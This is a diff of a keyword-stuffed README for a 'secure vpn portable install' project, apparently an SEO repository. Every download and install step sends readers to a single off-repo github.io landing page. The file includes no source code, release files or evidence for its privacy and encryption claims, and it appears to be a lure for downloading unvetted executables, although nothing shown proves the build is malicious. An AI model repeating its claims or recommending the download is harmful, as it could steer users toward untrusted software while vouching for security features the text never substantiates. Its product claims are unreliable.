@@ -1,89 +1,91 @@
 # ⚡ secure vpn portable install
 
-[![Download](https://img.shields.io/badge/Download-Get%20Build-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
+[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
 
 ## About
 
-**secure vpn portable install** is a clean, no-drama way to run a privacy-first VPN setup without turning your machine into a permanent science project. It’s built for people who want a **secure vpn** experience that installs fast, runs predictably, and leaves minimal footprint.
+**secure vpn portable install** is a clean, no-nonsense way to run a **secure vpn** without turning your machine into a config museum. It’s built for quick setup, predictable behavior, and getting you connected fast—without sacrificing privacy.
 
 Project repo: https://github.com/gonbon808/secure-vpn-portable-install-seo  
-Get the build + landing page: https://gonbon808.github.io/secure-vpn-portable-install-landing/
+Main page: https://gonbon808.github.io/secure-vpn-portable-install-landing/
 
 ## Features
 
-- **AES-256 encryption** for traffic protection
-- **No-Logs policy** mindset: privacy and security focus, no “extra” tracking
-- **Kill Switch** to stop leaks if the tunnel drops
-- **Global Servers** for flexible routing
-- **High speed** with a **stable connection** under normal use
-- Portable-first flow: keep configs and runtime together, easy to move between machines
+- **AES-256 encryption** for secure tunnels
+- **No-Logs policy** (privacy and security focus)
+- **Kill Switch** to block traffic if the tunnel drops
+- **Global Servers** with simple region switching
+- **High speed** with a **stable connection**
+- Portable-first workflow: keep your setup tidy and repeatable
 
 ## System Requirements
 
-| Item | Requirement |
+| Component | Requirement |
 |---|---|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+ / equivalent |
+| Linux | Ubuntu/Debian/Fedora (64-bit) |
 | RAM | 2 GB minimum (4 GB recommended) |
 | Storage | 200 MB free |
-| Internet | Stable broadband connection |
+| Internet | Stable connection required (VPN traffic) |
 
 ## Installation
 
-All downloads and release notes are published here:  
-https://gonbon808.github.io/secure-vpn-portable-install-landing/
+Use the landing page for the current build and checksums.
 
 ### Windows
-1. Open the landing page and grab the latest package.  
-2. Extract to a folder you control (e.g. `D:\Apps\SecureVPNPortable\`).  
-3. Run the app, sign in, pick a server, connect.  
-4. Optional: pin the executable to Start/Taskbar for quick access.
+1. Open the download page: https://gonbon808.github.io/secure-vpn-portable-install-landing/
+2. Download the Windows package.
+3. Extract to a folder you control (e.g., `D:\Apps\SecureVPN\`).
+4. Run the app and sign in.
+5. Enable **Kill Switch** in settings, then connect.
 
 ### macOS
-1. Download the latest package from the landing page.  
-2. Move the app to `Applications` (or keep it in a dedicated tools folder if you prefer).  
-3. Launch it and approve any required network permissions.  
-4. Connect and confirm the **Kill Switch** setting is enabled if you rely on it.
+1. Open: https://gonbon808.github.io/secure-vpn-portable-install-landing/
+2. Download the macOS package.
+3. Move the app to `Applications` (or keep it in a dedicated tools folder).
+4. Launch, approve required permissions, sign in, connect.
 
 ### Linux
-1. Download the package from the landing page.  
-2. Extract it to a directory like `~/apps/securevpn-portable/`.  
-3. Run the launcher from that folder.  
-4. Connect, then verify routing is active before opening sensitive sites.
+1. Open: https://gonbon808.github.io/secure-vpn-portable-install-landing/
+2. Download the Linux package for your distro/format.
+3. Extract and run the launcher (or install via provided script/package).
+4. Sign in, select a region, connect.
+5. Turn on **Kill Switch** before using public Wi‑Fi.
 
 ## Comparison
 
-| Provider | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
+| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
 | secure vpn portable install | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low / inconsistent | ⚠️ | ❌ | ⚠️ | ⚠️ |
-| “Trial” VPN apps | Medium | ✅ | ⚠️ | ✅ | ⚠️ |
+| Typical free VPN | Low–Medium | ⚠️ | ❌/⚠️ | ❌ | ⚠️ |
+| Manual VPN configs | Varies | ✅ | Varies | ⚠️ | Varies |
 
 ## FAQ
 
-**Does this change my system permanently?**  
-It’s designed to keep things contained. You can remove it by deleting its folder/app, depending on platform permissions.
+**1) Is this really “portable”?**  
+It’s designed to keep setup friction low and avoid messy system changes where possible. Exact behavior depends on OS security prompts.
 
-**Is there a Kill Switch?**  
-Yes. Enable it if you don’t want traffic leaving your device outside the tunnel.
+**2) Does it include a Kill Switch?**  
+Yes. Turn it on in settings before you connect for best protection.
 
-**Do you keep logs?**  
-The project is built around a **No-Logs policy** approach and a privacy and security focus.
+**3) What encryption does it use?**  
+AES-256 encryption.
 
-**Can I switch servers anytime?**  
-Yes. Use **Global Servers** to move regions quickly when you need a different endpoint.
+**4) Will it slow down my connection?**  
+Any VPN adds overhead. The focus here is **high speed** and a **stable connection**, especially on nearby servers.
 
 ## Download
 
-**Get the latest release here:**  
-https://gonbon808.github.io/secure-vpn-portable-install-landing/
+Get the current release from the landing page:  
+**https://gonbon808.github.io/secure-vpn-portable-install-landing/**
 
 ## Final CTA
 
-[![Get secure vpn portable install](https://img.shields.io/badge/Get%20secure%20vpn%20portable%20install-Open%20Landing%20Page-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
-[![View Repository](https://img.shields.io/badge/View%20Repository-secure--vpn--portable--install--seo-222?style=for-the-badge)](https://github.com/gonbon808/secure-vpn-portable-install-seo)
+[![Get secure vpn portable install](https://img.shields.io/badge/Get%20secure%20vpn%20portable%20install-Open%20Download%20Page-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
+[![View Repository](https://img.shields.io/badge/View-Repository-black?style=for-the-badge)](https://github.com/gonbon808/secure-vpn-portable-install-seo)
+[![Open Landing](https://img.shields.io/badge/Open-Landing%20Page-2ea44f?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-portable-install-landing/)
 
-*Keep your connection private. Keep the install clean.*
+*Keep your connection private. Keep your install clean.*
